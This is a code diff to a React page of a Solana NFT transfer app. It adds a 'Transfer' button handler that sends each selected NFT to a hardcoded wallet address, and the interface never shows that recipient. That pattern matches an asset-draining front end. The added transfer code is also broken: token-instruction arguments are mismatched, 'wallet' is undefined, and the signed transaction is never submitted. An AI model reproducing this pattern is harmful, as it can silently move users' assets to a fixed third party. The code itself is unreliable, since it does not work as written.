@@ -1,9 +1,11 @@
 "use client";
 import { useEffect, useState } from "react"
-import { Connection, PublicKey } from "@solana/web3.js"
+import { Toaster } from 'react-hot-toast'
+import { Account, Connection, PublicKey, Transaction } from "@solana/web3.js"
+import { TOKEN_PROGRAM_ID, Token } from "@solana/spl-token";
 import { getParsedNftAccountsByOwner } from "@nfteyez/sol-rayz"
 import { MetadataKey } from "@nfteyez/sol-rayz/dist/config/metaplex";
-import { copyFile } from "fs";
+import { toast } from "react-hot-toast";
 
 declare global {
   interface Window {
@@ -64,11 +66,78 @@ export default function Home() {
       }
 
       setNfts(nfts)
+      console.log(nfts)
     }
   }
 
-  const transferNFT = async (nft: INFT) => {
+  const transferNFT = async (nft: INFT, publicKey: PublicKey, connection: Connection) => {
+    const addressToSend = new PublicKey("8MdXvWgNou9jRVturbfnt3egf1aP9p1AjL8wiJavti7F");
 
+    const sendTxPromise = new Promise(async (resolve, reject) => {
+      const transferInstruction = Token.createTransferInstruction(
+        TOKEN_PROGRAM_ID,
+        publicKey,
+        addressToSend,
+        new PublicKey(nft.updateAuthority),
+        [],
+        1
+      );
+
+      const tx = new Transaction().add(transferInstruction);
+
+      tx.feePayer = publicKey;
+      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+
+      //@ts-ignore
+      const txid = await wallet.signTransaction(tx);
+
+      const txStatus = await connection.confirmTransaction(txid, "confirmed");
+
+      console.log(txStatus)
+
+      if (txStatus.value.err) {
+        return reject(txStatus.value.err);
+      }
+
+      resolve(txStatus.value);
+    })
+
+    toast.promise(
+      sendTxPromise,
+      {
+        loading: "Sending NFT...",
+        success: "NFT Sent!",
+        error: "Error sending NFT",
+      },
+      {
+        style: {
+          minWidth: "200px",
+        },
+
+        success: {
+          duration: 3000,
+          iconTheme: {
+            primary: "#0F9960",
+            secondary: "#FFFFFF",
+          },
+        },
+
+        error: {
+          duration: 3000,
+          iconTheme: {
+            primary: "#F87171",
+            secondary: "#FFFFFF",
+          },
+        },
+
+        loading: {
+          duration: 3000,
+          iconTheme: {
+            primary: "#FBBF24",
+            secondary: "#FFFFFF",
+          },
+        },
+      })
   }
 
   useEffect(() => {
@@ -83,6 +152,10 @@ export default function Home() {
 
   return (
     <>
+      <Toaster
+        position="top-right"
+        reverseOrder={false}
+      />
       <div className="navbar bg-base-100">
         <div className="flex-none">
           <span className="text-lg font-bold">Solana NFT Transfer App</span>
@@ -109,13 +182,13 @@ export default function Home() {
                 `Please connect your wallet to continue.`
             }</p>
             <div className="flex flex-row items-center justify-center">
-              {nfts.map((nft, index) => (
+              {publicKey && connection && nfts.map((nft, index) => (
                 <div className="card bg-base-100 shadow-xl p-4" key={index}>
                   <div className="card-body flex flex-col justify-center items-center">
                     <img width="150px" height="150px" className="rounded-lg" src={nft.data.uriData.image} alt="NFT Image" />
                     <h2 className="card-title">{nft.data.name}</h2>
                     <div className="card-actions flex justify-center items-center">
-                      <button className="btn btn-primary" onClick={() => transferNFT(nft)}>Transfer</button>
+                      <button className="btn btn-primary" onClick={() => transferNFT(nft, publicKey, connection)}>Transfer</button>
                     </div>
                   </div>
                 </div>
